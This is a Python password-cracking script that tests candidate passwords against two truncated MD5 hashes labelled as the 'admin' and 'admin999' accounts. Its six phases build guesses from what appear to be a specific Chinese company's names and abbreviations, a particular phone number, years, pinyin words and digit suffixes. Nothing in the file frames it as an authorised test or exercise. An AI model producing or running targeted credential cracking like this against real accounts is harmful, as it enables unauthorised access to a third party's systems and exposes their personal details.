import hashlib, sys, itertools

admin_hash = "2d9d5942943a1323"
admin999_hash = "79dca16741891333"

def check(pwd):
    m = hashlib.md5(pwd.encode()).hexdigest()
    mid = m[8:24]
    if mid == admin_hash:
        print(f"FOUND! admin = {pwd}")
        return True
    if mid == admin999_hash:
        print(f"FOUND! admin999 = {pwd}")
        return True
    return False

# Load rockyou as fast check base
print("Phase 1: Extended Chinese SEO patterns...")
bases = ["bjhzsv","BJHS","hongsheng","HongSheng","hongzuo","HongZuo",
         "beijing","Beijing","tenglong","Tenglong","admin","Admin"]
for base in bases:
    for y in range(2010, 2027):
        for s in ["", "!","@","#","$"]:
            pwds = [f"{base}{y}", f"{base}{y}{s}", f"{base}@{y}", f"{base}#{y}"]
            for p in pwds:
                if check(p): sys.exit(0)

# Extended: word+number up to 8 char
print("Phase 2: word+number combos...")
words = ["bjhzsv","hongshengjia","HongShengJia","beijinghongzuo","BeijingHongZuo",
         "tenglong","Tenglong","tenglongkeji","beijing","Beijing"]
for w in words:
    for n in range(0, 10000):
        if check(w + str(n)): sys.exit(0)

# Phone number patterns
print("Phase 3: phone numbers...")
phones = ["19908888893","1990888","08888893","1990888!","199-0888-8893"]
for p in phones:
    if check(p): sys.exit(0)
    if check(p + "admin"): sys.exit(0)

# Common Chinese pinyin+number
print("Phase 4: pinyin...")
pinyins = ["guanliyuan","mima","zhanghao","keji","gongsi","wangzhan",
           "hongzuo","shijia","shebei","yiqi","huaxue","fenxi"]
for py in pinyins:
    for n in range(0, 1000):
        if check(py + str(n)): sys.exit(0)
        if check(py.capitalize() + str(n)): sys.exit(0)

# Mixed case combos
print("Phase 5: mixed case...")
for base in ["bjhzsv","hongshengjia","beijinghongzuo","tenglong","tenglongkeji"]:
    variants = [
        base, base.upper(), base.capitalize(),
        base[:1].upper()+base[1:], 
        base[:-1]+base[-1].upper(),
    ]
    for v in variants:
        for s in ["","1","12","123","1234","12345","123456","888","666","999","!","@","#"]:
            if check(v+s): sys.exit(0)

print("Phase 6: 7-char alphanumeric starting with common prefixes...")
# bizh+3digits, bjhz+3digits etc
prefixes = ["bjhzsv","bjhs","hong","teng","beij","admin","pass"]
chars = "abcdefghijklmnopqrstuvwxyz0123456789"
for prefix in prefixes[:4]:  # limit
    for c1 in "0123456789":
        for c2 in "0123456789":
            for c3 in "0123456789":
                if check(prefix + c1 + c2 + c3): sys.exit(0)

print("Not found in extended patterns")
